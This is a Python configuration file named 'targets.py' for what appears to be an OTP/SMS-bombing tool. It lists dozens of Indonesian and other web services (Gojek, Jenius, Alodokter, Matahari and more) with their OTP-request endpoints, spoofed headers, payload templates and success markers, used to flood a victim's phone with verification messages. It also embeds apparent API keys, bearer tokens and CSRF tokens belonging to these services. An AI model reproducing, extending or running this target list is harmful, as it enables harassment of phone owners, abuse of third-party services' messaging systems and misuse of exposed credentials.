#!/usr/bin/env python3
# targets.py - RXIND OTP TARGETS

import uuid
import random
import string
from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_random_user_agent, get_public_ip

TARGETS = [
    {
        'name': 'HRS-BRE',
        'post_type': 'hrsbre',
        'number_fmt': fmt_08,
        'success_on': ['success', 'berhasil', 'otp', 'verifikasi', 'selamat']
    },
    {
        'name': 'EraFone',
        'post_type': 'erafone',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'PlanetBan',
        'post_type': 'planetban',
        'number_fmt': fmt_08,
        'success_on': ['status":true', 'success']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'HashMicro',
        'post_type': 'hashmicro',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'thank', 'terimakasih', 'redirect']
    },
    {
        'name': 'Klook',
        'post_type': 'klook',
        'number_fmt': fmt_plus,
        'success_on': ['requestId']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'number_fmt': fmt_08,
        'success_on': ['"statusCode":200']
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva',
        'post_type': 'kaniva',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'number_fmt': fmt_plus,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
    {
        'name': 'Watsons',
        'post_type': 'watsons',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'number_fmt': fmt_phone_only,
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
    {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['secretcode']
    },
    {
        'name': 'Maulagi',
        'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://maulagi.id',
            'x-ml-key': 'C59RUHBU59',
            'Accept': 'application/json, text/plain, */*'
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['"status":"success"']
    },
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'referer': 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
        'headers': {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com','base-url-core':'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}',
        'number_fmt': lambda p: p,
        'success_on': ['requestid']
    },
    {
        'name': 'Paper.ID',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dunia Games',
        'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'Bunda Hospital',
        'post_type': 'json',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'referer': 'https://www.bunda.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bunda.co.id','x-locale':'id'},
        'payload': '{"phone_number":{number},"type":"auth"}',
        'number_fmt': lambda p: int(p),
        'success_on': ['otp']
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },
    {
        'name': 'IRA OTP',
        'post_type': 'ira',
        'url': 'https://api.ira.id/v1/auth/request-otp',
        'referer': 'https://ira.id',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'Accept': 'application/json',
        },
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp', 'request_id']
    },
    {
        'name': 'Sahabat Daihatsu OTP',
        'post_type': 'sahabatdaihatsu',
        'url': 'https://www.sahabatdaihatsu.com/api/auth/request-otp',
        'referer': 'https://www.sahabatdaihatsu.com',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'Origin': 'https://www.sahabatdaihatsu.com',
        },
        'payload': '{"phone":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp', 'request_id']
    },
    {
        'name': 'Termii OTP',
        'post_type': 'termii',
        'url': 'https://api.ng.termii.com/api/sms/otp/send',
        'referer': 'https://termii.com',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
        },
        'payload': '{"phone_number":"{number}","api_key":"tlv_un2cAjeNmdp6UHFWFKSlIN4GmF73lBTR7e2yB5oLFO0"}',
        'number_fmt': fmt_08,
        'success_on': ['pinId', 'message']
    },
    {
        'name': 'VirtualSMS OTP',
        'post_type': 'virtualsms',
        'url': 'https://api.virtualsms.io/v1/orders',
        'referer': 'https://virtualsms.io',
        'headers': {
            'Authorization': 'Bearer vsms_36d05d05a23a5aed58f3b171d878da16a01c26ac39f0e4991f4f15f4f859178c',
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'Accept': 'application/json',
        },
        'payload': '{"service":"wa","country":"ID"}',
        'number_fmt': fmt_08,
        'success_on': ['phone_number', 'order_id']
    },
    {
        'name': 'Sayurbox WA',
        'post_type': 'sayurbox',
        'url': 'https://www.sayurbox.com/graphql/v1?deduplicate=1',
        'referer': 'https://www.sayurbox.com',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'x-sbox-tenant': 'sayurbox',
            'x-binary-version': '2.2.1',
            'accept': '*/*',
        },
        'payload': '{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62{number}"},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}',
        'number_fmt': fmt_08,
        'success_on': ['id', '__typename']
    },
    {
        'name': 'Carsome WA',
        'post_type': 'carsome',
        'url': 'https://www.carsome.id/website/login/sendSMS',
        'referer': 'https://www.carsome.id',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'x-language': 'id',
            'country': 'ID',
            'accept': 'application/json, text/plain, */*',
        },
        'payload': '{"username":"{number}","optType":1}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'otp']
    },
    {
        'name': 'Jenius WA',
        'post_type': 'jenius',
        'url': 'https://api.btpn.com/jenius',
        'referer': 'https://www.jenius.com',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d',
            'version': '2.36.1-7565',
            'accept': '*/*',
        },
        'payload': '{"query":"mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables":{"phone":"+62{number}","language":"id"},"operationName":"registerPhone"}',
        'number_fmt': fmt_08,
        'success_on': ['authId', 'tokenId']
    },
    {
        'name': 'Gojek WA',
        'post_type': 'gojek',
        'url': 'https://api.gojekapi.com/v5/customers',
        'referer': 'https://www.gojek.com',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'X-Platform': 'Android',
            'X-AppVersion': '3.52.2',
            'X-AppId': 'com.gojek.app',
            'X-Session-ID': str(uuid.uuid4()),
            'X-UniqueId': ''.join(random.choices('0123456789abcdef', k=16)),
            'Accept': 'application/json',
        },
        'payload': '{"email":"{email}","name":"{name}","phone":"62{number}","signed_up_country":"ID"}',
        'number_fmt': fmt_08,
        'success_on': ['customer', 'id']
    },
    {
        'name': 'Klikwa WA',
        'post_type': 'klikwa',
        'url': 'https://api.klikwa.net/v1/number/sendotp',
        'referer': 'https://klikwa.net',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': get_random_user_agent(),
            'Authorization': 'Basic QjMzOkZSMzM=',
            'accept': '*/*',
        },
        'payload': '{"number":"+62{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'otp']
    },
    {
        'name': 'Alodokter OTP',
        'post_type': 'alodokter',
        'url': 'https://www.alodokter.com/login-with-phone-number',
        'referer': 'https://www.alodokter.com/login-alodokter',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'X-Requested-With': 'XMLHttpRequest',
        },
        'payload': '{"user":{"phone":"{number}"}}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'status']
    },
    {
        'name': 'Klikdokter OTP',
        'post_type': 'klikdokter',
        'url': 'https://m.klikdokter.com/users/check',
        'referer': 'https://m.klikdokter.com/users/create?back-to=',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
            'Origin': 'https://m.klikdokter.com',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        },
        'payload': '_token={rand}&full_name=BambangSubianto&email={email}&phone={number}&back-to=&submit=Daftar',
        'number_fmt': fmt_08,
        'success_on': ['sessions/auth?user=']
    },
    {
        'name': 'Prosehat OTP',
        'post_type': 'prosehat',
        'url': 'https://www.prosehat.com/wp-admin/admin-ajax.php',
        'referer': 'https://www.prosehat.com/akun',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.prosehat.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
        },
        'payload': 'phone_or_email={number}&action=ajaxverificationsend',
        'number_fmt': fmt_08,
        'success_on': ['token', 'success']
    },
    {
        'name': 'Hijup OTP',
        'post_type': 'hijup',
        'url': 'https://www.hijup.com/sign_in',
        'referer': 'https://www.hijup.com/sign_in',
        'headers': {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.hijup.com',
            'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'next-url': '/sign_in',
        },
        'payload': '[{"phone_number":"{number}","store_path":"hijup"}]',
        'number_fmt': fmt_08,
        'success_on': ['otp', 'code', 'success']
    },
    {
        'name': 'Alodokter OTP V2',
        'post_type': 'alodokter_v2',
        'url': 'https://www.alodokter.com/resend-otp',
        'referer': 'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
        },
        'payload': '{"user":{"phone":"{number}","uuid":"{rand}"},"request_via":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp', 'success', 'code']
    },
    {
        'name': 'Blibli Tiket OTP',
        'post_type': 'bliblitiket',
        'url': 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
        'referer': 'https://account.bliblitiket.com/login/complete-details?clientId=9dc79e3916a042abc86c2aa525bff009',
        'headers': {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://account.bliblitiket.com',
            'x-request-id': str(uuid.uuid4()),
            'x-channel-id': 'MWEB',
            'x-lang': 'id',
            'x-entity': 'TIKET',
            'x-client-id': '9dc79e3916a042abc86c2aa525bff009',
        },
        'payload': '{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"{number}","recaptchaToken":""}',
        'number_fmt': fmt_plus,
        'success_on': ['requestId', 'success', 'otp']
    },
    {
        'name': 'Ohsome OTP',
        'post_type': 'ohsome',
        'url': 'https://ohsome.co.id/api/member/user/random_code_check',
        'referer': 'https://ohsome.co.id/login',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://ohsome.co.id',
            'language': 'id',
            'deviceid': 'ba0a0027a5e6e7cde77f0f94f2572495',
            'x-store-no': 'SC001',
            'traceparent': '00-6bd858f4bdf14f53a8d3de8e6741641a-d542ee3bee82f7f4-01',
            'platform': 'H5',
        },
        'payload': '{"country_code":"62","account":"{number}","type_id":2,"device_id":"ba0a0027a5e6e7cde77f0f94f2572495","check_code":"219097","image_id":"tcsRCTZ0RAvqQAvcUJDG"}',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Optik Melawai OTP',
        'post_type': 'optikmelawai',
        'url': 'https://api.optikmelawai.com/api/v3/auth/register/1',
        'referer': 'https://www.optikmelawai.com/',
        'headers': {
            'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
            'x-unique-user': 'GA1.1.1062236172.1780823549',
            'language': 'id',
            'Origin': 'https://www.optikmelawai.com',
        },
        'number_fmt': fmt_08,
        'success_on': ['success', 'otp']
    },
    {
        'name': 'Holland Bakery OTP',
        'post_type': 'hollandbakery',
        'url': 'https://www.hollandbakery.co.id/resend-otp-register',
        'referer': 'https://www.hollandbakery.co.id/login-phone',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.hollandbakery.co.id',
            'Referer': 'https://www.hollandbakery.co.id/users/verify_token',
        },
        'payload': 'phone={number}',
        'number_fmt': fmt_08,
        'success_on': ['verify', 'verification', 'kode verifikasi']
    },
]